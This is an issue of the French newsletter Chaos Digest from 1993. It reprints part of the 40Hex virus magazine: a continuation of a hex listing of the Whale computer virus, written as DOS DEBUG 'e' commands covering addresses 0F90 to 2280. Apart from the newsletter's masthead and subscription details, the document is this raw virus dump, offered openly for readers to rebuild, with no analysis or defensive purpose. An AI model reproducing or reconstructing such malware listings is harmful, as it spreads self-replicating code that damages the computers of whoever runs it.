Chaos Digest           Mercredi 19 Mai 1993        Volume 1 : Numero 29
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.29 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #006(2)-007 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #006(2)-007 (reprint)


[suite du listing hexa du virus Whale]

e 0F90  95 56 60 72 47 B2 0A 02 18 06 2A 37 74 7E FB A2
e 0FA0  DD 01 2C 81 29 87 2E 86 2C 08 9E 85 2E C8 DD 01
e 0FB0  ED C4 DF 2D 3F 52 12 40 AF 05 02 02 B0 04 02 90
e 0FC0  3E 32 37 01 53 17 E9 BE 13 E8 CE 3E FF CE 60 FB
e 0FD0  07 50 84 63 44 67 64 50 C8 A3 7B 45 6D 74 E0 73
e 0FE0  74 C0 63 54 67 77 97 45 75 74 BD 9A F3 4D 41 B8
e 0FF0  D4 77 72 E8 2F 12 E9 4E 13 81 D8 13 0F 55 71 E8
e 1000  67 E8 22 D2 46 F4 F6 44 F0 D2 E6 36 73 E5 D0 71
e 1010  E1 F4 D3 25 55 D6 C3 57 DA E7 C1 9A B4 C1 9B A1
e 1020  F5 10 0F 90 C0 C4 74 1F B2 F2 02 37 04 53 21 E8
e 1030  EE ED E8 28 E8 27 E3 67 2C 5B C6 C5 6B D8 C5 C7
e 1040  21 23 E6 6F E6 40 D7 E1 42 D6 E1 E0 D0 C7 C7 21
e 1050  1D D6 9F 83 D6 9E 96 40 D2 E1 0B FA D7 CB FB 9E
e 1060  26 FB DF DC 36 E0 72 CD CE 39 E5 86 E3 DD 6B C8
e 1070  01 C4 7E F2 A3 E8 78 F6 32 D7 CE 48 ED 16 E2 DD
e 1080  1F D0 95 C5 2E B5 F1 2E 0C F1 E0 D0 E8 92 E9 6D
e 1090  74 4F EA 74 16 4D 5A BE 44 12 64 DB 7A 68 76 CC
e 10A0  41 10 FD 57 79 50 72 9B 47 93 7C 8B 57 34 51 F5
e 10B0  6D CE 41 76 C5 5D 7C 8B 57 34 51 72 9B CC 41 10
e 10C0  47 93 7C 8B 57 34 51 F0 4E C0 7E E8 70 41 7C 8B
e 10D0  57 34 51 72 9B CC 43 10 FF 90 7C 8B 57 34 51 C8
e 10E0  44 DF 65 F1 DD 65 D9 8C 44 5D 74 C2 80 74 64 A2
e 10F0  8B 68 95 CD 51 52 83 B0 D9 84 A9 DE 65 2F C3 CE
e 1100  52 FA 40 97 B7 6B 2F 84 E0 1C 55 8C 68 92 C4 B2
e 1110  35 BE 23 C4 18 97 A0 8C 68 92 C4 B2 3C B2 97 73
e 1120  44 1C 4E 29 47 3C A2 D5 AA 5D 81 E2 87 2E 84 86
e 1130  A4 56 A3 6E 30 E2 7F 8C A0 7F 15 A2 7F AF 57 51
e 1140  82 2E B2 85 64 91 B7 86 96 D7 A4 99 83 2B A1 FD
e 1150  87 29 8E 83 51 82 EB 9D 48 64 91 94 B0 51 42 A4
e 1160  78 80 6E 7F B0 A3 7F A4 B3 F0 E8 F9 E4 BE 11 1B
e 1170  81 12 06 EF A5 D5 02 A7 27 68 63 D5 06 15 19 3D
e 1180  CE 39 13 E0 15 33 2C FA 81 12 7B 45 A5 FD 02 A7
e 1190  27 15 C9 92 C6 F5 0B E8 94 E4 E8 80 EA 2D E0 5E
e 11A0  F0 99 F0 C1 BB 3D 51 E0 5E C8 C9 F1 7E E1 82 4D
e 11B0  F6 FE E2 16 10 46 95 DE E8 60 DB 50 C5 D5 B3 E3
e 11C0  55 03 60 FB 39 F6 B3 E3 08 6B D6 CE D0 E8 55 EA
e 11D0  43 D4 09 95 27 CF 34 D2 77 D7 D4 CF 72 DA C1 F2
e 11E0  D4 94 D9 30 A1 CE CD 92 D7 FA 1F F4 42 C4 49 DE
e 11F0  E1 4B C2 E1 16 94 CF 7A D3 A2 10 2C 05 B2 FA 43
e 1200  F3 D4 05 B2 FA 43 F0 D4 05 B2 FA 43 F1 D4 09 5B
e 1210  26 09 87 C4 A5 C3 CF 8E F2 52 E8 8C FC 4B 83 E4
e 1220  03 8E FC 98 1F D1 C8 01 ED 66 0B 52 70 72 2C 60
e 1230  0B CF EE F2 CF 50 E9 68 E1 E9 4B 19 E9 82 EF E8
e 1240  27 EA 2D AA 77 79 58 B1 0C A4 09 A9 AA EB 97 99
e 1250  5F 68 EA 11 54 10 9F 88 4E DF 0A 4A 7B CC 23 5E
e 1260  0C 4F 90 38 EA B1 73 BC F9 A9 42 D2 7E 42 86 9C
e 1270  84 D0 B9 3A 13 89 F1 A0 00 CE FB C6 DE 1D A6 68
e 1280  BC 55 09 62 25 47 B8 B8 87 5D 5B 8F BA E9 7A 13
e 1290  2E E0 97 33 2C FA E9 A5 13 EA CE B5 F8 05 25 DE
e 12A0  8A D7 8D E1 06 8F 1E 25 66 A8 25 36 9E E5 6E F5
e 12B0  65 BD E0 03 C9 24 AA 31 53 C7 C2 F8 D9 C7 F8 ED
e 12C0  39 34 D0 E8 5B EB 24 A2 7F 44 50 89 83 1B C7 84
e 12D0  2B 40 37 A2 A4 44 22 EA 85 98 E2 81 28 8A 04 41
e 12E0  88 AA 2A 89 AC 86 65 2A 4A 09 8B 87 FB 54 DE 08
e 12F0  E0 4D B6 1D E3 2C 3F C4 13 6A 83 0F C4 19 F1 24
e 1300  E8 35 E6 E6 F3 E0 FA 2C 08 B8 FC FC 52 1A 2E D8
e 1310  15 20 26 2F E2 53 1F E8 9B E2 F8 E5 20 C0 20 0C
e 1320  C6 A4 E3 E8 97 E2 F9 E5 3E E8 31 EB 12 AC CA 3E
e 1330  FD B7 75 BA FF AF 82 10 94 0F BD D1 44 D3 85 BF
e 1340  D0 E8 D9 E4 3D 70 AD A5 81 6B D6 7E C9 73 70 30
e 1350  7D 94 05 6A F0 37 73 98 7D 5F 94 05 6A 6E 36 AC
e 1360  42 A1 ED 3C 45 A1 93 40 22 62 4B 58 6F 42 DD 80
e 1370  FA F3 53 FC 1A 70 B9 A5 D4 AD A6 78 AD 6D 81 AD
e 1380  51 7F 7B C3 1D 6C 1E EB 54 F1 C6 C6 45 23 D6 24
e 1390  17 5E 0D B9 5E 1F B9 61 A6 0B C8 90 08 D7 C6 A5
e 13A0  BC 9C EE 54 2C 40 F6 D9 59 0D CD 67 03 47 D4 F3
e 13B0  D5 63 13 C5 02 22 2D E8 55 2A C0 3D 4F E1 3E 1D
e 13C0  61 3B B3 1F 55 FA E1 A0 C4 BE 16 C0 FF 3C F6 3C
e 13D0  6C 11 EB 54 F1 76 95 45 23 D6 24 17 59 06 B8 5E
e 13E0  1E B9 61 96 0B CB 90 1D 3D C4 E0 DB 89 BA DB 47
e 13F0  0A 75 E5 FF 6C 11 EB 52 10 61 E1 50 A0 56 00 E3
e 1400  37 31 0B DD 46 0C C5 2E 69 D4 2D 3A 54 28 92 2A
e 1410  46 DC D4 B3 E2 8B 05 E6 CA 2F D0 09 33 08 94 C6
e 1420  61 E2 C0 E4 96 45 23 D4 33 02 20 9D 15 8C 2E 4E
e 1430  D4 96 B8 3D EE E0 59 0D B3 59 1D FF 54 05 81 09
e 1440  2E FE D5 7C E2 D5 47 D7 D3 C2 E3 0F 24 18 54 05
e 1450  6D D5 39 D7 8C 38 29 A1 C1 E6 CA 2E DA 09 D9 FE
e 1460  16 7F E0 C4 46 29 16 05 08 96 C6 61 E2 5C C3 56
e 1470  05 E1 2D 85 02 20 9D 1C 8C 2E 4F D4 94 A2 8F 2E
e 1480  C9 D5 4A 2B 86 4A 3B CA 47 23 B4 1A 08 CA C6 58
e 1490  D7 C6 61 E2 5C C3 45 C7 23 37 31 61 16 4B E0 2A
e 14A0  F1 BB 2B 0D 94 D2 C0 FF 3D FF 3C CA D8 23 6C D7
e 14B0  23 53 2F 23 3D 84 E0 54 F1 D8 D4 45 23 D7 24 17
e 14C0  8E 3E B9 3D 77 E1 3E C5 C3 52 CA 08 FD C6 6C 1E
e 14D0  D8 6E 0E 9D 61 3E 59 C3 3D D8 E0 6D C4 E0 54 F1
e 14E0  D8 D4 C7 23 37 3E 61 16 4B E0 2A F1 BB 2B 0D 94
e 14F0  D2 C0 FF 3C FC 3C CA D8 23 6C D7 23 53 0B 23 19
e 1500  40 2D 54 37 00 41 85 61 D2 38 E0 96 24 18 5E 04
e 1510  BA 5C 15 B9 85 2D CB 3D C7 E0 16 7D 81 09 9F E1
e 1520  1E C8 59 11 D7 FF 2B 0F A3 54 E9 1E D5 85 02 2D
e 1530  90 69 0B 47 26 58 C6 1E D9 98 94 0B C0 18 CA 2F
e 1540  DA 09 9C 50 95 40 00 3D BF E1 3E 0D 60 38 D4 60
e 1550  14 F8 E1 DA 45 23 D1 45 0B D7 24 16 52 2D BD 52
e 1560  1B 0B FF 2E E1 D5 05 B9 6E A7 3C D4 0D EE 6C 05
e 1570  F0 CA 38 25 FC C9 A3 2C 85 02 2C 4D 0B 54 03 6D
e 1580  D5 F8 1E 9B C6 BD A1 18 E6 CA 2F DB 09 9F B5 68
e 1590  A1 C5 90 F8 1F 00 2D 2B 54 07 DE 3B 2D E9 96 31
e 15A0  FF 56 05 E2 37 3F 23 3D 33 1F 3D E7 E0 3F D4 B0
e 15B0  3D EC E0 54 04 80 09 73 F1 64 05 67 0F 2E 3F 2A
e 15C0  30 E6 E6 E2 1E A1 19 6C 14 48 39 3D 80 3C 8C 9E
e 15D0  73 8D 57 54 EA 38 24 3D 47 E1 8D 2D 32 59 0D 6E
e 15E0  0E 9C B2 16 47 11 93 F4 0B DC F7 EF 56 05 E3 9E
e 15F0  24 18 16 2E 14 2A 2E FF D5 40 3F 3D ED E0 52 15
e 1600  61 16 A7 3C 6C 05 F1 3D 26 1F 23 C0 D3 F1 38 94
e 1610  34 4A 22 5B 1C 09 9D 1A B8 8D 4D 38 8D 4F 21 E7
e 1620  22 60 19 86 08 55 C7 0B 05 4A 2B 5B 1D BA 87 05
e 1630  63 3E C4 61 14 FA 0E 5E C1 A3 96 EF E7 37 3C BB
e 1640  02 9F 0B FD 9D B3 16 C8 FF 3D 3E 1F 54 05 BD 09
e 1650  7F 21 C4 4D E7 96 85 E1 D2 24 1A 54 05 72 D5 46
e 1660  9F D4 C7 94 34 C0 C3 14 D9 08 95 1A 54 E5 46 24
e 1670  C5 90 5E B3 D2 1F 41 C6 F1 8B 2D 2B 54 2F 24 C4
e 1680  45 0B D7 4D E7 96 85 C9 D2 24 1A 8E 9F 0B FF 9D
e 1690  1C 86 05 EE CA 2E 17 2A 47 0B 76 E5 59 14 D7 6B
e 16A0  C2 85 A3 D4 D1 02 2F 93 5D E6 C2 DE 55 78 E0 F5
e 16B0  C7 BD A1 18 E6 CA 2E DF 09 72 C0 D7 22 5D B3 E2
e 16C0  CE 2A 50 E0 D4 2D 2C 5C F5 20 D4 0D 6A D2 EE A7
e 16D0  2A 45 0B D7 45 1B CA B3 13 8E 3A B9 3D E3 E0 DB
e 16E0  3B FF 8D 2E CB D5 55 59 16 D7 63 3E D8 6A C2 C6
e 16F0  B7 2A 8D 15 9E 24 16 55 F8 D3 F1 C7 94 C0 C0 15
e 1700  CA 2E A0 09 9E D2 31 46 2C 95 39 F6 B3 E3 08 1B
e 1710  39 B8 85 05 E1 1E 7F E1 D5 87 6A D2 C6 A7 2A EF
e 1720  2B 56 3D FF A0 32 BB 8C 2E C4 D5 9D EE CA 2E CB
e 1730  D5 55 63 3E DB 59 16 D7 6A D2 EE A7 2A 8D AB 37
e 1740  31 60 EB F5 C4 D4 B2 F6 D3 ED 20 CA 2E A1 09 9E
e 1750  54 95 90 5E BD E3 1F 03 98 08 1A 39 B8 85 05 0B
e 1760  23 D1 16 CA 45 23 D4 24 17 8E 3A B9 3D 72 E1 3E
e 1770  C1 6C 1F 48 3A 3D C5 E0 02 2D 16 8F 47 0A 48 E5
e 1780  19 52 1C 59 5F EA 18 54 37 EF DA 30 FF 23 D1 A3
e 1790  28 24 18 60 4B 50 D4 C4 25 02 3E DC D4 B2 57 59
e 17A0  07 6C 05 ED 20 CB 48 39 8C 2F D0 09 30 FF 23 D1
e 17B0  A3 37 3F B9 8E 41 2B 3D 73 E1 3E C1 6C 1D 48 38
e 17C0  3D C4 E0 3E 31 B8 F8 5A C3 46 7F CE 0B 47 11 7E
e 17D0  3B 16 C2 30 FF 96 24 19 65 48 37 E9 C7 94 C6 4A
e 17E0  20 5E 1E FE 5B 1D BB FE 06 09 E9 1A E3 5C 29 45
e 17F0  C1 0A 23 C4 07 3E E9 72 B5 96 8F 08 DD C6 A9 23
e 1800  D9 63 16 C4 A9 16 9B 08 21 39 94 E5 2D 19 80 C8
e 1810  18 CA 2E C3 D5 77 64 54 2B 41 F6 4D 3D 60 E5 08
e 1820  09 39 95 2E 4F 08 5E 2D 61 10 48 E0 EB 38 AE D5
e 1830  9B 94 07 C0 FF 85 4F 28 88 C8 B5 1E 9B BB 8C 2E
e 1840  99 D4 2D 2A 96 94 A9 3D CE E0 23 D1 A9 56 05 E2
e 1850  9C 05 BA 3D 32 1F A1 E8 0B 2C 94 EE CA 2E C3 D5
e 1860  47 0A 75 E5 69 06 7F C3 51 40 2D 3D 1A 1F A0 3D
e 1870  72 5C 1C 61 17 48 E0 52 15 1E DA 9C 94 D2 C0 FF
e 1880  85 F5 20 8F 94 23 8F 9D B9 3D BD E1 02 3E 0B 1F
e 1890  2D EE 8E 72 A0 8C 2E 5A D4 2D EC 8E C8 FF 86 05
e 18A0  08 FC C6 95 2E 2D 0B 3D 37 1F 6C 59 C3 FC 0D 63
e 18B0  3C DC 08 C2 C6 95 2E 46 57 5B C6 E1 A1 CB 08 0F
e 18C0  39 61 3E 72 C3 9E 4F 28 86 C0 FF 16 39 D7 8D F6
e 18D0  A7 D7 F6 A7 D4 45 23 D6 45 09 D6 05 0B DB 9D B9
e 18E0  61 86 08 6F C7 0B D9 9D B3 DB D9 23 3D EC E0 A0
e 18F0  3D 0B 3E 2E 11 2A 7E 7F F6 EF 23 6C DC E0 E6 0E
e 1900  08 C3 C6 95 2E 46 57 5B C6 E1 A1 19 08 0D 39 61
e 1910  3E 71 C3 86 C0 69 1D D9 23 5F E1 D0 B2 C7 D0 B2
e 1920  C4 63 16 C5 63 3C C5 23 3E DE B8 5E 1E B8 83 4F
e 1930  21 2A F0 86 F0 7E E0 95 98 1F 03 98 19 45 3E 09
e 1940  D2 C6 1E D2 85 02 2E 2D 01 3D E4 E0 6C 43 C3 54
e 1950  2D 49 F6 38 EF 96 24 1B 80 4D 0B 54 03 6E D5 F5
e 1960  20 EB 46 9E D5 C7 BD A1 CF E6 CA 2F D6 09 C8 FF
e 1970  8E 95 23 18 96 1E 1C 2D F6 5F C1 A3 5F E1 66 11
e 1980  4E A7 2A 8F 68 F2 85 D3 15 8F 23 DB D9 0B C6 2E
e 1990  07 2A 3E 95 2F 9E BB 8C 93 1F E3 A0 C5 88 F8 1F
e 19A0  00 9B 08 D5 C6 59 51 E5 BB 54 2D 56 F6 2E 29 2A
e 19B0  B3 1B 55 79 6F D5 C7 1C A1 16 E6 CA 2F D1 09 4F
e 19C0  A9 85 2D F7 5F C1 A3 5F E1 66 35 4E A7 2A 4E C7
e 19D0  96 F5 20 56 2F E2 16 C8 FF 3E D3 08 33 39 95 2E
e 19E0  9E BB 2E 9F 1F E3 A0 C5 5A C0 7A F0 39 F6 4F E3
e 19F0  08 D5 C6 BB 54 2D 58 F6 7F 64 F6 2E 26 2A B3 1B
e 1A00  55 79 6F D5 C7 94 1A C0 FF 3C F6 3C 87 4C 97 2A
e 1A10  96 6A C2 38 2E E5 F1 66 27 45 23 D4 24 13 8C 9E
e 1A20  09 D0 C6 08 D5 C6 0B D8 4D 30 8D 4D 38 8D 57 1F
e 1A30  C3 A0 C5 3E 28 BB 6C 43 C3 DB 47 0B 4A E5 FF 5F
e 1A40  81 1F 2B 0E D0 D2 85 02 23 46 5F 5B C6 E1 A0 C7
e 1A50  23 D3 F5 20 CA 2F D0 09 38 29 55 F1 87 96 8F A3
e 1A60  9C B3 17 2A F0 86 F0 49 E6 4C E3 BB 8C 2D E3 3D
e 1A70  E9 E0 2A D0 79 F0 2D 17 6D C4 E0 54 05 81 08 38
e 1A80  2F 6C 42 C1 DB F4 08 CA 46 D7 B2 8F E1 16 8F 95
e 1A90  22 47 23 5A C6 1E DA C0 FF A0 C7 23 5C 0E 09 E6
e 1AA0  1A BB 3E 12 A9 55 F1 08 56 05 E2 56 2F E2 A0 33
e 1AB0  BB 2A F0 86 F0 49 E6 4D E3 0B D6 2E CE D5 9F 1F
e 1AC0  C3 5E C5 3E 30 58 D7 C6 61 16 A7 3C 6C 40 C3 DB
e 1AD0  F5 28 CA 46 D7 3D C7 23 FE 0E 95 22 47 23 5A C6
e 1AE0  1E DA C0 FF A0 C7 23 5C 0E 09 E1 1A BB 3E 10 D3
e 1AF0  87 4C 97 2A 4C F7 E5 F1 66 27 45 23 D4 24 15 8F
e 1B00  3D BB 8C 39 F6 B3 E3 08 D6 C6 A0 E6 18 EB 23 38
e 1B10  27 8E 47 0B 74 E5 63 16 C4 59 50 E2 1E 18 C8 FF
e 1B20  5F 81 1F E5 C1 A3 37 3E 61 16 48 E0 52 18 1E D9
e 1B30  B3 E3 52 35 23 D3 F5 20 CA 2F D0 09 94 6A A2 39
e 1B40  6A C2 C6 D7 53 10 A3 37 31 BA 8E 9F B6 6B A1 C5
e 1B50  9B 39 F4 3D C4 E0 E6 18 61 23 B0 F8 8E 98 61 3E
e 1B60  59 C3 6C 43 C3 DB D9 6A 92 39 C8 D2 85 02 2D 47
e 1B70  23 5B C6 67 26 38 EC A0 C5 67 0B 05 E6 E6 06 FF
e 1B80  3C F3 3C 5E 08 E5 83 F2 B0 55 F1 E5 2B C1 A3 37
e 1B90  3E B8 96 87 1D 2C 96 37 8D 9D B9 2A D0 86 F0 2E
e 1BA0  E3 D5 7D E1 83 9D 61 3E 59 C3 6C F2 69 6C 43 C3
e 1BB0  DB 96 58 D5 C6 6E 0D 9E FF 2B C9 60 E2 C3 A3 37
e 1BC0  3E 59 F6 C6 1E 5A 48 E0 A1 72 E6 6C C6 E0 CA 2F
e 1BD0  D2 09 05 1B 85 11 60 E2 D6 63 16 C7 02 2D 9E BB
e 1BE0  8C 90 5E B3 E3 18 2A D2 18 8B 85 08 FC C6 61 3E
e 1BF0  59 C3 6C 41 C3 9C 3F A9 55 F1 F0 56 05 E1 37 3E
e 1C00  6B 1E 7F 6E D5 C7 2B 2B C9 94 D7 2D E1 16 C0 58
e 1C10  D5 C6 FF 2D 2F D9 09 9D B3 DB 97 19 8C D9 18 16
e 1C20  46 E7 D0 45 23 D4 24 18 8E 87 B9 83 78 86 F0 39
e 1C30  F4 2D 98 A2 85 9C 70 3D C7 E0 2D 9D 61 3E 59 C3
e 1C40  60 E5 51 50 2E F9 D5 46 CF D0 85 18 56 04 F2 37
e 1C50  30 61 16 48 E0 2B C9 95 DE 05 A3 54 07 9A D8 11
e 1C60  EE CA 05 44 D3 D9 09 E6 1A B8 8E 3E CE C7 EE 06
e 1C70  43 EB 02 51 E9 9E 4B B4 36 4F 50 02 B9 7E 46 44
e 1C80  13 94 B9 B8 76 43 0B F5 80 4E 58 CB 57 9E BA 55
e 1C90  57 D0 E8 88 FD 0A 2E A0 7C 3C A2 E0 26 F3 E1 2B
e 1CA0  10 2E A6 24 C6 65 F1 F9 E5 3D C7 20 8A 07 26 13
e 1CB0  E8 CE 9C EE 3B 89 72 C9 8D C8 08 BF B4 36 9F B2
e 1CC0  98 A7 65 AA EF BF 4B 68 6D 5F 00 49 E6 82 41 54
e 1CD0  3E 9F A2 66 05 1B 13 40 54 70 B8 26 50 2E D9 05
e 1CE0  66 03 61 59 CE 4F EE 05 CC F1 70 DA 2B DD E2 56
e 1CF0  F7 3E FB D7 40 C1 0F E8 67 F8 8F EC 30 E2 20 EF
e 1D00  AA FA D7 4C E1 23 E8 DF 11 B2 DA DD 66 2F 9E 11
e 1D10  3D 08 EC 16 40 36 72 03 FB 28 C8 0D 71 DC BA 22
e 1D20  E3 50 5F DD 74 59 73 4C 8E 41 04 54 DC 25 6F 79
e 1D30  C1 9D 73 39 99 C1 66 99 18 67 6E E5 A7 E8 25 FD
e 1D40  0A 52 54 AF 19 8F F1 56 8F 4A 57 6C C3 CE E0 ED
e 1D50  2A F1 D0 04 DF 24 C2 2B C6 C5 19 CE C1 FC CF AA
e 1D60  FB E0 CB 36 40 37 01 10 DE 53 04 48 AC 56 00 76
e 1D70  C0 94 D3 B6 A4 D3 34 6D EB 40 31 7D BF 70 35 65
e 1D80  90 96 C0 3E 09 19 8E 53 45 40 D0 F6 08 90 3E A7
e 1D90  36 04 54 35 0E 7D 93 EF 06 3D A1 5D 36 39 FE 61
e 1DA0  19 08 9A 1E 5D 36 EB 34 FB 2E A6 3D A8 3A 41 2E
e 1DB0  D9 25 79 03 4A 80 DB 53 C6 F4 9C 06 28 13 8F 20
e 1DC0  1F 00 08 93 06 8E 0F 52 CE AA 06 CF 3E E6 CE 61
e 1DD0  ED 60 D3 28 53 34 F3 2F 6B C1 A4 E0 12 C8 2C D6
e 1DE0  80 F6 EE 6F C5 67 C2 FD 63 43 F7 78 E4 91 F3 2F
e 1DF0  E0 12 C8 2C D6 80 F6 EE 6F C5 6B C2 FD 63 4F F7
e 1E00  78 E6 91 EE 6D C5 65 C2 FD 4B E8 74 E4 C8 2C D6
e 1E10  80 F6 28 24 35 28 97 D7 87 E5 4B 5B 7F F8 8A 2C
e 1E20  D3 75 0B FB 1D CB 01 E1 E9 71 C7 74 D6 1F 2F 7B
e 1E30  07 E9 0D F7 A1 D7 09 97 F6 F2 54 18 F6 E3 93 74
e 1E40  25 93 ED A6 FA 4E C0 3D 83 28 A0 24 27 FA 45 C0
e 1E50  2F 01 53 6A E8 CA FF 0D 34 2F 91 12 B2 36 CA F7
e 1E60  D7 B4 E9 36 30 0F 74 25 93 ED A6 FB F2 D8 67 03
e 1E70  A6 D6 80 CE DE EC 34 EA D7 20 FC 9F FA 63 BF 23
e 1E80  C4 7A C9 59 DD DF 02 F9 DB F9 E9 30 FA E8 2B 16
e 1E90  E4 07 1F 02 C0 32 50 9E 13 00 A8 CB 58 D9 25 0C
e 1EA0  26 EC 36 28 13 0E A9 15 0E 26 D4 06 2A 13 0A 3B
e 1EB0  DF 83 CE 9D EC 30 D9 F6 EE AC C4 04 7B 34 98 D0
e 1EC0  4B 82 2F CA C8 5A 94 14 D9 22 51 DA DD CF A8 E5
e 1ED0  CE 63 EC B3 A9 52 F8 4F 0E B6 87 45 8A CF 9F 1C
e 1EE0  57 B8 E8 A1 3A 62 AA CE 97 40 CD 9C 29 40 8F DA
e 1EF0  B1 75 C6 BA 1C 53 AF EE AA 53 FB A9 53 A2 A9 EE
e 1F00  D4 EC 9A CB E1 FB D0 EC 9A D5 E7 9A CF EC FB CE
e 1F10  EA F2 BC E6 FC BC FD F2 D9 89 82 BC EF F3 CF E1
e 1F20  B0 91 E0 9A DD E4 9A BB D7 D1 F2 D3 C3 EA C6 C7
e 1F30  BB 89 F3 D2 89 F2 DD E4 F8 C9 FB FD B8 1D B3 92
e 1F40  B6 00 73 B4 94 63 BF DC B9 87 7D 9A 31 9F 68 5D
e 1F50  01 04 8C 26 92 FA 89 5C 27 62 5B AF BC 9C 56 45
e 1F60  74 25 BE 74 FD 5F 74 89 B9 0A D0 E9 3B F6 2E A6
e 1F70  35 B3 02 ED E8 CF EE 74 D4 FB C7 CD 22 F9 F1 63
e 1F80  EF 72 CE D7 56 E4 56 FB C4 3E D9 5B DD DF EA 11
e 1F90  E3 14 D7 7E 43 DD F1 61 EF 74 CE D4 DF CE 7A 05
e 1FA0  EA D7 F4 EC 5C FB C4 E2 C9 4D DD 37 31 FB ED 6A
e 1FB0  08 E1 55 FC 26 13 E9 08 F8 E8 A1 F8 1A E8 A8 C6
e 1FC0  D3 1C B9 EC F3 6D 47 F9 E0 63 D3 69 CC F3 45 FE
e 1FD0  78 EA E3 14 26 5A DF D5 53 16 83 DC 0F 76 03 FB
e 1FE0  61 CD 0E E0 E8 78 F6 6B D7 54 F9 DD 6B C8 5C C4
e 1FF0  E8 0C F6 A0 D6 CE C5 F5 51 E2 7A A6 3A 1B 69 C4
e 2000  ED E9 B9 F4 89 F1 9A D6 08 10 3E 89 37 83 D9 0F
e 2010  72 23 20 FF CD 15 F7 A5 FC 1C D1 CC E8 02 F8 5C
e 2020  3E 80 DA 10 80 0E 97 2F 36 B5 05 B3 1A 88 DA 31
e 2030  88 C9 3E 88 FA CE 8A F2 C2 28 9B E7 0B 19 FC 88
e 2040  C9 3E B3 18 7C 25 E7 28 6D 3D 87 17 18 17 F2 31
e 2050  CF BF 27 10 80 0E 93 2F 36 C1 1D 7E 1B 25 19 38
e 2060  A6 3C 10 22 1E 91 2F 36 3F 0D A9 1A 38 D1 86 0B
e 2070  5A 84 17 18 10 F4 0E 58 2E F0 33 09 45 CF 4C FF
e 2080  CE D3 EA 33 23 1E 95 05 83 32 DD D8 3A C7 1E E9
e 2090  35 56 33 CB 96 F2 CB C0 17 35 73 2F 3D 83 28 A0
e 20A0  24 27 FA FE C0 FB 83 CC E5 47 31 93 75 2F FA F2
e 20B0  C0 EB 42 38 14 52 CD FB 89 CC 02 DC 7B A0 C6 FA
e 20C0  EB 5F A5 D3 DC 7A A0 CB 7A 27 61 FB DD E9 F5 F5
e 20D0  E8 56 F9 46 AC 71 F2 47 87 B9 6C 17 52 6B 9F 84
e 20E0  AC E9 8A 6B 9F 86 AC CF 8D B3 17 8C E9 BD 8C B3
e 20F0  18 A4 AE 99 FA AE 15 50 E6 17 50 0D 9A 8A 81 E9
e 2100  88 AD 5B 29 AF 99 D5 EE 17 48 A2 86 34 52 BF 33
e 2110  2C 8A 03 5B 64 B9 77 71 E5 AD DE F3 83 EF 06 9E
e 2120  A2 01 76 3D 8E 20 56 24 9F 7F 23 CF 5D 03 CE 01
e 2130  EA 74 90 AD 63 96 59 81 90 6B EA 74 8D 15 83 9C
e 2140  4D E6 67 29 96 AC 81 19 9D 88 B4 0F A3 AB A7 17
e 2150  92 0A BB A9 A7 2D 86 D3 81 78 7F 46 19 A5 7A B4
e 2160  0F B3 4D A7 AB 28 FE 85 C0 3B D5 90 3A 5A 6F 0D
e 2170  65 A3 7C 15 5B 71 0B DF 1F A3 C7 1F FD 10 4F A4
e 2180  C0 6B A0 91 D0 BB 20 C0 D9 3D 2D 02 FA E8 95 FA
e 2190  39 18 23 21 06 9D 2D 36 E8 28 35 09 D6 D5 CE 21
e 21A0  A8 09 D6 0C C9 B7 06 10 1A A2 10 22 A8 09 B2 1E
e 21B0  12 1A F0 9A DD F0 32 DD 06 7D 86 18 2D B0 C0 75
e 21C0  F9 1E 2B 3E 68 2D 21 F0 92 3E 22 D0 F6 CE 60 E9
e 21D0  38 B3 48 30 50 8E 43 A5 99 A2 03 B3 6E 3E 43 A8
e 21E0  76 B6 BB 97 10 A2 5B 23 65 5B 4B 64 5B 3A 86 AC
e 21F0  C3 28 4B E8 6B FA 1A B2 A9 53 B4 D7 B0 B3 83 7C
e 2200  E4 64 7C 07 65 C4 9C 26 27 96 8A 94 B3 D7 7C CA
e 2210  87 8F BB 4B 5D 08 EC 2E 13 37 00 BA 3D 8F 20 9D
e 2220  25 08 B0 60 03 3D 89 38 71 25 08 9A 0E 42 36 26
e 2230  1D 13 72 24 D0 02 75 9A C1 14 FE 26 1C 1B 73 61
e 2240  EB 2E 87 73 25 08 98 1E 44 36 2E AD 1D 64 03 3D
e 2250  FF 10 9D 25 BB D0 89 E3 F7 40 2C D3 74 DC 48 53
e 2260  9F 37 00 0F D8 2E 16 14 43 C4 E9 E8 26 13 5B A5
e 2270  D0 14 08 9B 07 AF FB C3 AF D6 5B 75 AA 24 26 3D
e 2280  80 11 71 43 C4 EA 89 CE D0 9C 08 9C 06 A8 36 2E
